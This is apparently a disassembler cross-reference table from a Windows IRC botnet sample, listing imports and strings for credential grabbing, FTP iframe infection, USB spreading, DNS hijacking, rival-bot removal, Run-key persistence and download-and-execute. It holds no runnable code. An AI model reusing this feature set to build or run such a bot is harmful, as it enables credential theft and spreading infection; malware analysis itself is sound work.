reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x3ccd70	0x3d1120	import	0x3cbbb0	KERNEL32.dll.lstrcpyA
0x3ccdfc	0x3d1534	string	0x3cbbb0	msnu
0x3cce55	0x3d1330	string	0x3cbbb0	pdef
0x3cce66	0x3d1b04	string	0x3cbbb0	ffgrab
0x3cce7b	0x3d1b0c	string	0x3cbbb0	iegrab
0x3cce8c	0x3d1a9c	string	0x3cbbb0	ftpgrab
0x3cce9d	0x3d1a68	string	0x3cbbb0	popgrab
0x3cceb2	0x3d13e4	string	0x3cbbb0	bdns
0x3ccec7	0x3d2b1c	string	0x3cbbb0	usbi
0x3ccf67	0x3d60ac	string	0x3cbbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0x3ccfe3	0x3d2c34	string	0x3cbbb0	%s[%s{%s
0x3cd003	0x3d1184	import	0x3cbbb0	KERNEL32.dll.lstrlenA
0x3cd013	0x3d1178	import	0x3cbbb0	KERNEL32.dll.HeapAlloc
0x3cd02b	0x3d1120	import	0x3cbbb0	KERNEL32.dll.lstrcpyA
0x3cd043	0x3d5868	string	0x3cbbb0	ssyn
0x3cd097	0x3d2c34	string	0x3cbbb0	%s[%s{%s
0x3cd0b7	0x3d1184	import	0x3cbbb0	KERNEL32.dll.lstrlenA
0x3cd0c8	0x3d1178	import	0x3cbbb0	KERNEL32.dll.HeapAlloc
0x3cd0dc	0x3d1120	import	0x3cbbb0	KERNEL32.dll.lstrcpyA
0x3cd0f0	0x3d10cc	import	0x3cbbb0	KERNEL32.dll.CreateThread
0x3cd0f7	0x3d1150	import	0x3cbbb0	KERNEL32.dll.CloseHandle
0x3cd145	0x3d1128	import	0x3cd110	KERNEL32.dll.lstrcmpA
0x3cd18c	0x3d10a0	import	0x3cd110	KERNEL32.dll.lstrcpynA
0x3cd198	0x3d1184	import	0x3cd110	KERNEL32.dll.lstrlenA
0x3cd231	0x3d1184	import	0x3cd220	KERNEL32.dll.lstrlenA
0x3cd243	0x3d2d18	string	0x3cd220	MOTD
0x3cd2b5	0x3d1128	import	0x3cd220	KERNEL32.dll.lstrcmpA
0x3cd2bb	0x3d5d78	string	0x3cd220	PING
0x3cd2d1	0x3d5d6c	string	0x3cd220	PPNG %s\r\n
0x3cd2f6	0x3cd31d	string	0x3cd220	h\f-=
0x3cd308	0x3d5d30	string	0x3cd220	SEND %s %s\r\n
0x3cd33c	0x3d5d24	string	0x3cd220	KCIK %s\r\n
0x3cd351	0x3d18c4	string	0x3cd220	JOIN
0x3cd37f	0x3d5d80	string	0x3cd220	PPPPMSG
0x3cd43c	0x3d5d30	string	0x3cd220	SEND %s %s\r\n
0x3cd5cd	0x3d18d0	string	0x3cd530	%s:%d
0x3cd5e4	0x3d1188	import	0x3cd530	KERNEL32.dll.Sleep
0x3cd659	0x3d1188	import	0x3cd530	KERNEL32.dll.Sleep
0x3cd6fd	0x3d1018	import	0x3cd6b0	ADVAPI32.dll.RegCreateKeyExW
0x3cd731	0x3d1000	import	0x3cd6b0	ADVAPI32.dll.RegSetValueExW
0x3cd740	0x3d1020	import	0x3cd6b0	ADVAPI32.dll.RegCloseKey
0x3cd753	0x3d1020	import	0x3cd6b0	ADVAPI32.dll.RegCloseKey
0x3cd7b2	0x3d1178	import	0x3cd7a0	KERNEL32.dll.HeapAlloc
0x3cd80b	0x3d1180	import	0x3cd7a0	KERNEL32.dll.HeapFree
0x3cd819	0x3d1180	import	0x3cd7a0	KERNEL32.dll.HeapFree
0x3cd82f	0x3d116c	import	0x3cd7a0	KERNEL32.dll.GetLastError
0x3cd83c	0x3d1180	import	0x3cd7a0	KERNEL32.dll.HeapFree
0x3cd852	0x3d116c	import	0x3cd7a0	KERNEL32.dll.GetLastError
0x3cd85b	0x3d1180	import	0x3cd7a0	KERNEL32.dll.HeapFree
0x3cd87a	0x3d1170	import	0x3cd7a0	KERNEL32.dll.ReadFile
0x3cd8fa	0x3d57a0	string	0x3cd7a0	30e4*Ta1
0x3cd900	0x3d1184	import	0x3cd7a0	KERNEL32.dll.lstrlenA
0x3cd908	0x3d57a0	string	0x3cd7a0	30e4*Ta1
0x3cd916	0x3d1178	import	0x3cd7a0	KERNEL32.dll.HeapAlloc
0x3cd952	0x3d1184	import	0x3cd7a0	KERNEL32.dll.lstrlenA
0x3cd95e	0x3d10a0	import	0x3cd7a0	KERNEL32.dll.lstrcpynA
0x3cd96d	0x3d10a0	import	0x3cd7a0	KERNEL32.dll.lstrcpynA
0x3cd973	0x3d1128	import	0x3cd7a0	KERNEL32.dll.lstrcmpA
0x3cd979	0x3d63a0	string	0x3cd7a0	ftplog
0x3cd98b	0x3d6298	string	0x3cd7a0	[FTP Login]: %s
0x3cd99f	0x3d1184	import	0x3cd7a0	KERNEL32.dll.lstrlenA
0x3cd9af	0x3d1178	import	0x3cd7a0	KERNEL32.dll.HeapAlloc
0x3cd9bb	0x3d2d3c	string	0x3cd7a0	FTP ->
0x3cd9c1	0x3d1120	import	0x3cd7a0	KERNEL32.dll.lstrcpyA
0x3cd9c9	0x3d1088	import	0x3cd7a0	KERNEL32.dll.lstrcatA
0x3cd9e8	0x3d63a8	string	0x3cd7a0	poplog
0x3cd9fb	0x3d62a8	string	0x3cd7a0	[POP3 Login]: %s
0x3cda0f	0x3d1184	import	0x3cd7a0	KERNEL32.dll.lstrlenA
0x3cda1f	0x3d1178	import	0x3cd7a0	KERNEL32.dll.HeapAlloc
0x3cda2b	0x3d2d30	string	0x3cd7a0	POP3 ->
0x3cda31	0x3d1120	import	0x3cd7a0	KERNEL32.dll.lstrcpyA
0x3cda39	0x3d1088	import	0x3cd7a0	KERNEL32.dll.lstrcatA
0x3cda58	0x3d63b0	string	0x3cd7a0	ftpinfect
0x3cda6b	0x3d62bc	string	0x3cd7a0	[FTP Infect]: %s was iframed
0x3cda83	0x3d63c8	string	0x3cd7a0	httptraff
0x3cda96	0x3d62f0	string	0x3cd7a0	[HTTP Traffic]: %s
0x3cdaae	0x3d63bc	string	0x3cd7a0	httplogin
0x3cdac0	0x3d62dc	string	0x3cd7a0	[HTTP Login]: %s
0x3cdad4	0x3d1184	import	0x3cd7a0	KERNEL32.dll.lstrlenA
0x3cdae2	0x3d1178	import	0x3cd7a0	KERNEL32.dll.HeapAlloc
0x3cdaf0	0x3d1120	import	0x3cd7a0	KERNEL32.dll.lstrcpyA
0x3cdb0f	0x3d63d4	string	0x3cd7a0	ruskill
0x3cdb1b	0x3d2d28	string	0x3cd7a0	disable
0x3cdb38	0x3d6304	string	0x3cd7a0	[Ruskill]: Detected File: "%s"
0x3cdb50	0x3d63dc	string	0x3cd7a0	rdns
0x3cdb62	0x3d6324	string	0x3cd7a0	[Ruskill]: Detected DNS: "%s"
0x3cdb7a	0x3d63e4	string	0x3cd7a0	rreg
0x3cdb8d	0x3d6344	string	0x3cd7a0	[Ruskill]: Detected Reg: "%s"
0x3cdbb8	0x3d6364	string	0x3cd7a0	[PDef+]: %s
0x3cdbe2	0x3d6370	string	0x3cd7a0	[DNS]: Blocked DNS "%s"
0x3cdc0a	0x3d6388	string	0x3cd7a0	[MSN]: %s
0x3cdc37	0x3d13dc	string	0x3cd7a0	block
0x3cdc46	0x3d63f8	string	0x3cd7a0	httpspread
0x3cdc59	0x3d6394	string	0x3cd7a0	[HTTP]: %s
0x3cdc80	0x3d1180	import	0x3cd7a0	KERNEL32.dll.HeapFree
0x3cdc91	0x3d1180	import	0x3cd7a0	KERNEL32.dll.HeapFree
0x3cdcaa	0x3d1170	import	0x3cd7a0	KERNEL32.dll.ReadFile
0x3cdcc1	0x3d116c	import	0x3cd7a0	KERNEL32.dll.GetLastError
0x3cdccc	0x3d116c	import	0x3cd7a0	KERNEL32.dll.GetLastError
0x3cdcd6	0x3d107c	import	0x3cd7a0	KERNEL32.dll.FlushFileBuffers
0x3cdce0	0x3d111c	import	0x3cd7a0	KERNEL32.dll.DisconnectNamedPipe
0x3cdcea	0x3d1150	import	0x3cd7a0	KERNEL32.dll.CloseHandle
0x3cdcfc	0x3d1180	import	0x3cd7a0	KERNEL32.dll.HeapFree
0x3cddcf	0x3d119c	import	0x3cddb0	KERNEL32.dll.EnterCriticalSection
0x3cddee	0x3d2d8c	string	0x3cddb0	http://
0x3cde11	0x3d1184	import	0x3cddb0	KERNEL32.dll.lstrlenA
0x3cde44	0x3d2d84	string	0x3cddb0	dlds
0x3cde5a	0x3d116c	import	0x3cddb0	KERNEL32.dll.GetLastError
0x3cde9a	0x3d1188	import	0x3cddb0	KERNEL32.dll.Sleep
0x3cdeac	0x3d1188	import	0x3cddb0	KERNEL32.dll.Sleep
0x3cdfa6	0x3d2d84	string	0x3cddb0	dlds
0x3cdffe	0x3d2d44	string	0x3cddb0	[d="%s" s="%d bytes"] Download error: MD5 mismatch (%s != %s)
0x3ce017	0x3d61c8	string	0x3cddb0	[d="%s" s="%d bytes"] File "%S" has an invalid binary type. [type="%d"]
0x3ce030	0x3d6188	string	0x3cddb0	[d="%s" s="%d bytes"] Error creating process "%S" [e="%d"]
0x3ce042	0x3d6154	string	0x3cddb0	[d="%s"] Error writing download to "%S" [e="%d"]
0x3ce060	0x3d6210	string	0x3cddb0	[d="%s"] Error getting temporary filename. [e="%d"]
0x3ce080	0x3d6244	string	0x3cddb0	[d='%s"] Error getting application data path [e="%d"]
0x3ce08e	0x3d6128	string	0x3cddb0	[d="%s"] Error downloading file [e="%d"]
0x3ce0a5	0x3d5df0	string	0x3cddb0	[d="%s" s="%d bytes"] Executed file "%S" - Download retries: %d
0x3ce0dd	0x3d1180	import	0x3cddb0	KERNEL32.dll.HeapFree
0x3ce0f8	0x3d1198	import	0x3cddb0	KERNEL32.dll.LeaveCriticalSection
0x3ce14b	0x3d119c	import	0x3ce130	KERNEL32.dll.EnterCriticalSection
0x3ce17e	0x3d116c	import	0x3ce130	KERNEL32.dll.GetLastError
0x3ce18b	0x3d116c	import	0x3ce130	KERNEL32.dll.GetLastError
0x3ce198	0x3d116c	import	0x3ce130	KERNEL32.dll.GetLastError
0x3ce1a5	0x3d116c	import	0x3ce130	KERNEL32.dll.GetLastError
0x3ce1c8	0x3d1188	import	0x3ce130	KERNEL32.dll.Sleep
0x3ce22b	0x3d1188	import	0x3ce130	KERNEL32.dll.Sleep
0x3ce24d	0x3d1184	import	0x3ce130	KERNEL32.dll.lstrlenA
0x3ce292	0x3d1130	import	0x3ce130	KERNEL32.dll.MoveFileExW
0x3ce2a4	0x3d1130	import	0x3ce130	KERNEL32.dll.MoveFileExW
0x3ce2c0	0x3d1120	import	0x3ce130	KERNEL32.dll.lstrcpyA
0x3ce2d3	0x3d1128	import	0x3ce130	KERNEL32.dll.lstrcmpA
0x3ce2de	0x3d2d94	string	0x3ce130	rebooting
0x3ce2e3	0x3d5d60	string	0x3ce130	QUIT :%s\r\n
0x3ce2fa	0x3d1188	import	0x3ce130	KERNEL32.dll.Sleep
0x3ce30a	0x3d1188	import	0x3ce130	KERNEL32.dll.Sleep
0x3ce312	0x3d2d20	string	0x3ce130	bsod
0x3ce359	0x3d60ec	string	0x3ce130	[d="%s" s="%d bytes"] Update error: MD5 mismatch (%s != %s)
0x3ce36e	0x3d61c8	string	0x3ce130	[d="%s" s="%d bytes"] File "%S" has an invalid binary type. [type="%d"]
0x3ce378	0x3d116c	import	0x3ce130	KERNEL32.dll.GetLastError
0x3ce383	0x3d6154	string	0x3ce130	[d="%s"] Error writing download to "%S" [e="%d"]
0x3ce39f	0x3d116c	import	0x3ce130	KERNEL32.dll.GetLastError
0x3ce3ae	0x3d6154	string	0x3ce130	[d="%s"] Error writing download to "%S" [e="%d"]
0x3ce3c7	0x3d116c	import	0x3ce130	KERNEL32.dll.GetLastError
0x3ce3d1	0x3d6210	string	0x3ce130	[d="%s"] Error getting temporary filename. [e="%d"]
0x3ce3ea	0x3d116c	import	0x3ce130	KERNEL32.dll.GetLastError
0x3ce3f4	0x3d6244	string	0x3ce130	[d='%s"] Error getting application data path [e="%d"]
0x3ce3fb	0x3d116c	import	0x3ce130	KERNEL32.dll.GetLastError
0x3ce405	0x3d6128	string	0x3ce130	[d="%s"] Error downloading file [e="%d"]
0x3ce41c	0x3d5da8	string	0x3ce130	[d="%s" s="%d bytes"] Updated bot file "%S" - Download retries: %d
0x3ce43a	0x3d10c4	import	0x3ce130	KERNEL32.dll.DeleteFileW
0x3ce45d	0x3d1180	import	0x3ce130	KERNEL32.dll.HeapFree
0x3ce478	0x3d1198	import	0x3ce130	KERNEL32.dll.LeaveCriticalSection
0x3ce4fa	0x3d1188	import	0x3ce4b0	KERNEL32.dll.Sleep
0x3ce50b	0x3d2da0	string	0x3ce4b0	[Login]: %s
0x3ce517	0x3d1184	import	0x3ce4b0	KERNEL32.dll.lstrlenA
0x3ce536	0x3d2da0	string	0x3ce4b0	[Login]: %s
0x3ce57a	0x3d1180	import	0x3ce4b0	KERNEL32.dll.HeapFree
0x3ce5c9	0x3d119c	import	0x3ce590	KERNEL32.dll.EnterCriticalSection
0x3ce64e	0x3d1184	import	0x3ce590	KERNEL32.dll.lstrlenA
0x3ce678	0x3d1120	import	0x3ce590	KERNEL32.dll.lstrcpyA
0x3ce687	0x3d10a0	import	0x3ce590	KERNEL32.dll.lstrcpynA
0x3ce699	0x3d13e4	string	0x3ce590	bdns
0x3ce6b2	0x3d13e4	string	0x3ce590	bdns
0x3ce6b7	0x3d13dc	string	0x3ce590	block
0x3ce6e1	0x3ca970	string	0x3ce590	h0+=
0x3ce6fe	0x3d2dac	string	0x3ce590	[DNS]: Blocked %d domain(s) - Redirected %d domain(s)
0x3ce71e	0x3d1180	import	0x3ce590	KERNEL32.dll.HeapFree
0x3ce73a	0x3d1198	import	0x3ce590	KERNEL32.dll.LeaveCriticalSection
0x3ce77c	0x3d1184	import	0x3ce770	KERNEL32.dll.lstrlenA
0x3ce793	0x3d100c	import	0x3ce770	ADVAPI32.dll.RegOpenKeyExA
0x3ce79e	0x3d1010	import	0x3ce770	ADVAPI32.dll.RegSetValueExA
0x3ce7c3	0x3d1014	import	0x3ce770	ADVAPI32.dll.RegNotifyChangeKeyValue
0x3ce7d1	0x3d1020	import	0x3ce770	ADVAPI32.dll.RegCloseKey
0x3ce805	0x3d2de4	string	0x3ce7e0	[Speed]: Estimated upload speed %d KB/s
0x3ce8a8	0x3d57a0	string	0x3ce880	30e4*Ta1
0x3ce8ad	0x3d1184	import	0x3ce880	KERNEL32.dll.lstrlenA
0x3ce8b4	0x3d57a0	string	0x3ce880	30e4*Ta1
0x3ce8bf	0x3d6904	string	0x3ce880	\\.\pipe\%08x_ipc
0x3ce8d5	0x3d11ac	import	0x3ce880	KERNEL32.dll.CreateNamedPipeA
0x3ce909	0x3d1150	import	0x3ce880	KERNEL32.dll.CloseHandle
0x3ce913	0x3d11a8	import	0x3ce880	KERNEL32.dll.ConnectNamedPipe
0x3ce91d	0x3d116c	import	0x3ce880	KERNEL32.dll.GetLastError
0x3ce941	0x3d10cc	import	0x3ce880	KERNEL32.dll.CreateThread
0x3cea14	0x3d114c	import	0x3ce9f0	KERNEL32.dll.LoadLibraryW
0x3cea1d	0x3d2eb0	string	0x3ce9f0	ws2_32.dll
0x3cea24	0x3d2e98	string	0x3ce9f0	secur32.dll
0x3cea2b	0x3d2e80	string	0x3ce9f0	wininet.dll
0x3cea32	0x3d57ac	string	0x3ce9f0	FvLQ49I
0x3cea3b	0x3d10dc	import	0x3ce9f0	KERNEL32.dll.CreateMutexA
0x3cea44	0x3d10f8	import	0x3ce9f0	KERNEL32.dll.WaitForSingleObject
0x3cea57	0x3cea64	string	0x3ce9f0	ht.=
0x3cea64	0x3d2e74	string	0x3ce9f0	IPC_Check
0x3cea74	0x3cea7d	string	0x3ce9f0	SWhl.=
0x3cea7f	0x3d2e6c	string	0x3ce9f0	running
0x3cea84	0x3d2e64	string	0x3ce9f0	binBot
0x3cea9d	0x3d10c4	import	0x3ce9f0	KERNEL32.dll.DeleteFileW
0x3ceacf	0x3d1078	import	0x3ce9f0	KERNEL32.dll.CopyFileW
0x3ceadf	0x3d5b80	string	0x3ce9f0	Software\Microsoft\Windows\CurrentVersion\Run
0x3ceaee	0x3d1188	import	0x3ce9f0	KERNEL32.dll.Sleep
0x3ceb61	0x3d1120	import	0x3ce9f0	KERNEL32.dll.lstrcpyA
0x3ceb67	0x3d1184	import	0x3ce9f0	KERNEL32.dll.lstrlenA
0x3ceb88	0x3d14f8	string	0x3ce9f0	msnmsg
0x3cebe9	0x3d1500	string	0x3ce9f0	msnint
0x3cec32	0x3d1194	import	0x3ce9f0	KERNEL32.dll.InitializeCriticalSection
0x3cec6f	0x3d2e3c	string	0x3ce9f0	%s:Zone.Identifier
0x3cec75	0x3d129c	import	0x3ce9f0	USER32.dll.wsprintfW
0x3cec97	0x3d116c	import	0x3ce9f0	KERNEL32.dll.GetLastError
0x3cec9d	0x3d10cc	import	0x3ce9f0	KERNEL32.dll.CreateThread
0x3cecb4	0x3d1150	import	0x3ce9f0	KERNEL32.dll.CloseHandle
0x3ced3a	0x3d5b80	string	0x3ce9f0	Software\Microsoft\Windows\CurrentVersion\Run
0x3ced4e	0x3d2e0c	string	0x3ce9f0	Software\Microsoft\Windows\CurrentVersion\Run
0x3cee35	0x3d1248	import	0x3cedf0	SHLWAPI.dll.PathAppendA
0x3cee5b	0x3d1320	import	0x3cee40	ole32.dll.CoCreateInstance
0x3cee89	0x3d1120	import	0x3cee40	KERNEL32.dll.lstrcpyA
0x3cee9c	0x3d1088	import	0x3cee40	KERNEL32.dll.lstrcatA
0x3ceef4	0x3d1230	import	0x3cee40	SHELL32.dll.SHGetFileInfoA
0x3cef25	0x3d2ae4	string	0x3cee40	shell32.dll
0x3cefa4	0x3d113c	import	0x3cee40	KERNEL32.dll.MultiByteToWideChar
0x3ceff4	0x3d1140	import	0x3cefe0	KERNEL32.dll.GetFileAttributesA
0x3cf039	0x3d124c	import	0x3cefe0	SHLWAPI.dll.PathFindExtensionA
0x3cf03f	0x3d1128	import	0x3cefe0	KERNEL32.dll.lstrcmpA
0x3cf109	0x3d10b0	import	0x3cefe0	KERNEL32.dll.SetFileAttributesA
0x3cf17b	0x3d1120	import	0x3cf130	KERNEL32.dll.lstrcpyA
0x3cf196	0x3d1068	import	0x3cf130	KERNEL32.dll.SetCurrentDirectoryA
0x3cf1aa	0x3d106c	import	0x3cf130	KERNEL32.dll.FindFirstFileA
0x3cf1c2	0x3d131c	import	0x3cf130	ole32.dll.CoInitialize
0x3cf1d0	0x3d2fd8	string	0x3cf130	%s%s
0x3cf20c	0x3d1070	import	0x3cf130	KERNEL32.dll.FindNextFileA
0x3cf25a	0x3d2fd8	string	0x3cf130	%s%s
0x3cf290	0x3d1070	import	0x3cf130	KERNEL32.dll.FindNextFileA
0x3cf29e	0x3d1074	import	0x3cf130	KERNEL32.dll.FindClose
0x3cf2e3	0x3d2fe4	string	0x3cf2b0	\\.\%c:
0x3cf2fa	0x3d1110	import	0x3cf2b0	KERNEL32.dll.CreateFileA
0x3cf352	0x3d1098	import	0x3cf2b0	KERNEL32.dll.DeviceIoControl
0x3cf35b	0x3d1150	import	0x3cf2b0	KERNEL32.dll.CloseHandle
0x3cf58b	0x3d129c	import	0x3cf430	USER32.dll.wsprintfW
0x3cf5cd	0x3d2fd8	string	0x3cf430	%s%s
0x3cf5e6	0x3d2fd8	string	0x3cf430	%s%s
0x3cf615	0x3d2fec	string	0x3cf430	%S%S\
0x3cf672	0x3d10b0	import	0x3cf430	KERNEL32.dll.SetFileAttributesA
0x3cf6aa	0x3d105c	import	0x3cf430	KERNEL32.dll.CreateDirectoryA
0x3cf6b4	0x3d116c	import	0x3cf430	KERNEL32.dll.GetLastError
0x3cf6ce	0x3d1078	import	0x3cf430	KERNEL32.dll.CopyFileW
0x3cf6d9	0x3d5cd0	string	0x3cf430	[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}
0x3cf6de	0x3d1184	import	0x3cf430	KERNEL32.dll.lstrlenA
0x3cf6eb	0x3d5cd0	string	0x3cf430	[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}
0x3cf6f6	0x3d2b1c	string	0x3cf430	usbi
0x3cf747	0x3d1158	import	0x3cf430	KERNEL32.dll.CreateFileW
0x3cf757	0x3d1164	import	0x3cf430	KERNEL32.dll.WriteFile
0x3cf7da	0x3d1120	import	0x3cf430	KERNEL32.dll.lstrcpyA
0x3cf7ee	0x3d1088	import	0x3cf430	KERNEL32.dll.lstrcatA
0x3cf800	0x3d1088	import	0x3cf430	KERNEL32.dll.lstrcatA
0x3cf813	0x3d1184	import	0x3cf430	KERNEL32.dll.lstrlenA
0x3cf828	0x3d1184	import	0x3cf430	KERNEL32.dll.lstrlenA
0x3cf87c	0x3d1184	import	0x3cf430	KERNEL32.dll.lstrlenA
0x3cf8b1	0x3d1150	import	0x3cf430	KERNEL32.dll.CloseHandle
0x3cf8ba	0x3d10b0	import	0x3cf430	KERNEL32.dll.SetFileAttributesA
0x3cf8c4	0x3d1188	import	0x3cf430	KERNEL32.dll.Sleep
0x3cf8eb	0x3cf903	string	0x3cf430	95ȿ@ blocks=Basic Latin,Latin Extended-B
0x3cf909	0x3cf91e	string	0x3cf430	95Ŀ@ blocks=Basic Latin,Latin Extended-A
0x3cf94d	0x3d1110	import	0x3cf430	KERNEL32.dll.CreateFileA
0x3cf95c	0x3d1060	import	0x3cf430	KERNEL32.dll.GetFileSize
0x3cf98d	0x3d1064	import	0x3cf430	KERNEL32.dll.LockFile
0x3cf993	0x3d2b1c	string	0x3cf430	usbi
0x3cf9ce	0x3d1064	import	0x3cf430	KERNEL32.dll.LockFile
0x3cfa22	0x3d1058	import	0x3cf9e0	KERNEL32.dll.GetLogicalDriveStringsA
0x3cfa2e	0x3d1088	import	0x3cf9e0	KERNEL32.dll.lstrcatA
0x3cfac0	0x3d1298	import	0x3cfaa0	USER32.dll.DefWindowProcA
0x3cfaf3	0x3d3044	string	0x3cfaa0	%c:\
0x3cfb31	0x3d5f3c	string	0x3cfaa0	[USB]: Infected %s
0x3cfbe7	0x3d304c	string	0x3cfb60	gdkWindowToplevelClass
0x3cfc05	0x3d1280	import	0x3cfb60	USER32.dll.RegisterClassExA
0x3cfc1a	0x3d304c	string	0x3cfb60	gdkWindowToplevelClass
0x3cfc20	0x3d1284	import	0x3cfb60	USER32.dll.CreateWindowExA
0x3cfc30	0x3d1288	import	0x3cfb60	USER32.dll.RegisterDeviceNotificationA
0x3cfc3b	0x3d128c	import	0x3cfb60	USER32.dll.GetMessageA
0x3cfc4f	0x3d1290	import	0x3cfb60	USER32.dll.TranslateMessage
0x3cfc67	0x3d1294	import	0x3cfb60	USER32.dll.DispatchMessageA
0x3cfcb8	0x3d57a0	string	0x3cfc90	30e4*Ta1
0x3cfcbd	0x3d1184	import	0x3cfc90	KERNEL32.dll.lstrlenA
0x3cfcc4	0x3d57a0	string	0x3cfc90	30e4*Ta1
0x3cfcf2	0x3d10ac	import	0x3cfc90	KERNEL32.dll.lstrcpyW
0x3cfcf8	0x3d1120	import	0x3cfc90	KERNEL32.dll.lstrcpyA
0x3cfd51	0x3d1188	import	0x3cfc90	KERNEL32.dll.Sleep
0x3cfdb9	0x3d331c	string	0x3cfd80	-_.!~*'()
0x3cfe11	0x3d117c	import	0x3cfe00	KERNEL32.dll.GetProcessHeap
0x3cfe39	0x3d1184	import	0x3cfe00	KERNEL32.dll.lstrlenA
0x3cfe47	0x3d1178	import	0x3cfe00	KERNEL32.dll.HeapAlloc
0x3cfe89	0x3d1178	import	0x3cfe00	KERNEL32.dll.HeapAlloc
0x3cfebb	0x3d1120	import	0x3cfe00	KERNEL32.dll.lstrcpyA
0x3cfecd	0x3d1088	import	0x3cfe00	KERNEL32.dll.lstrcatA
0x3cff0a	0x3d1088	import	0x3cfe00	KERNEL32.dll.lstrcatA
0x3cff1f	0x3d1178	import	0x3cfe00	KERNEL32.dll.HeapAlloc
0x3cff4b	0x3d1088	import	0x3cfe00	KERNEL32.dll.lstrcatA
0x3cff85	0x3d1088	import	0x3cfe00	KERNEL32.dll.lstrcatA
0x3cff9a	0x3d1178	import	0x3cfe00	KERNEL32.dll.HeapAlloc
0x3cffbe	0x3d1088	import	0x3cfe00	KERNEL32.dll.lstrcatA
0x3cffcb	0x3d1180	import	0x3cfe00	KERNEL32.dll.HeapFree
0x3cffdf	0x3d1088	import	0x3cfe00	KERNEL32.dll.lstrcatA
0x3d0005	0x3d1180	import	0x3cfe00	KERNEL32.dll.HeapFree
0x3d0080	0x3d117c	import	0x3d0050	KERNEL32.dll.GetProcessHeap
0x3d00ab	0x3d1184	import	0x3d0050	KERNEL32.dll.lstrlenA
0x3d00b6	0x3d1178	import	0x3d0050	KERNEL32.dll.HeapAlloc
0x3d00cb	0x3d1120	import	0x3d0050	KERNEL32.dll.lstrcpyA
0x3d00d2	0x3d1184	import	0x3d0050	KERNEL32.dll.lstrlenA
0x3d00e3	0x3d1178	import	0x3d0050	KERNEL32.dll.HeapAlloc
0x3d010b	0x3d1088	import	0x3d0050	KERNEL32.dll.lstrcatA
0x3d0148	0x3d332c	string	0x3d0050	Content-Length:
0x3d015a	0x3d332c	string	0x3d0050	Content-Length:
0x3d01a5	0x3d2b98	string	0x3d0050	\r\n\r\n
0x3d01be	0x3d1180	import	0x3d0050	KERNEL32.dll.HeapFree
0x3d0213	0x3d117c	import	0x3d01e0	KERNEL32.dll.GetProcessHeap
0x3d0223	0x3d119c	import	0x3d01e0	KERNEL32.dll.EnterCriticalSection
0x3d0254	0x3d1184	import	0x3d01e0	KERNEL32.dll.lstrlenA
0x3d025f	0x3d1178	import	0x3d01e0	KERNEL32.dll.HeapAlloc
0x3d0272	0x3d1120	import	0x3d01e0	KERNEL32.dll.lstrcpyA
0x3d027b	0x3d2b98	string	0x3d01e0	\r\n\r\n
0x3d02f9	0x3d030e	string	0x3d01e0	h\f+=
0x3d0316	0x3d2b04	string	0x3d01e0	http
0x3d034c	0x3d2b04	string	0x3d01e0	http
0x3d0360	0x3d2b14	string	0x3d01e0	httpi
0x3d0386	0x3d1184	import	0x3d01e0	KERNEL32.dll.lstrlenA
0x3d03a8	0x3d63f8	string	0x3d01e0	httpspread
0x3d03ad	0x3d3340	string	0x3d01e0	%s.%s hijacked!
0x3d03da	0x3d1180	import	0x3d01e0	KERNEL32.dll.HeapFree
0x3d03f2	0x3d1180	import	0x3d01e0	KERNEL32.dll.HeapFree
0x3d03fd	0x3d1198	import	0x3d01e0	KERNEL32.dll.LeaveCriticalSection
0x3d043e	0x3d1184	import	0x3d0430	KERNEL32.dll.lstrlenA
0x3d044c	0x3d117c	import	0x3d0430	KERNEL32.dll.GetProcessHeap
0x3d0453	0x3d1178	import	0x3d0430	KERNEL32.dll.HeapAlloc
0x3d0493	0x3d117c	import	0x3d0430	KERNEL32.dll.GetProcessHeap
0x3d04a9	0x3d1120	import	0x3d0430	KERNEL32.dll.lstrcpyA
0x3d04bf	0x3d33cc	string	0x3d0430	SDG %d
0x3d04d6	0x3d33b8	string	0x3d0430	X-MMS-IM-Format:
0x3d0505	0x3d1178	import	0x3d0430	KERNEL32.dll.HeapAlloc
0x3d0534	0x3d1120	import	0x3d0430	KERNEL32.dll.lstrcpyA
0x3d053a	0x3d1088	import	0x3d0430	KERNEL32.dll.lstrcatA
0x3d0551	0x3d332c	string	0x3d0430	Content-Length:
0x3d056a	0x3d33a4	string	0x3d0430	Content-Length: %d
0x3d0590	0x3d339c	string	0x3d0430	From:
0x3d05a9	0x3d2b98	string	0x3d0430	\r\n\r\n
0x3d05b5	0x3d338c	string	0x3d0430	Reliability:
0x3d05ce	0x3d2b98	string	0x3d0430	\r\n\r\n
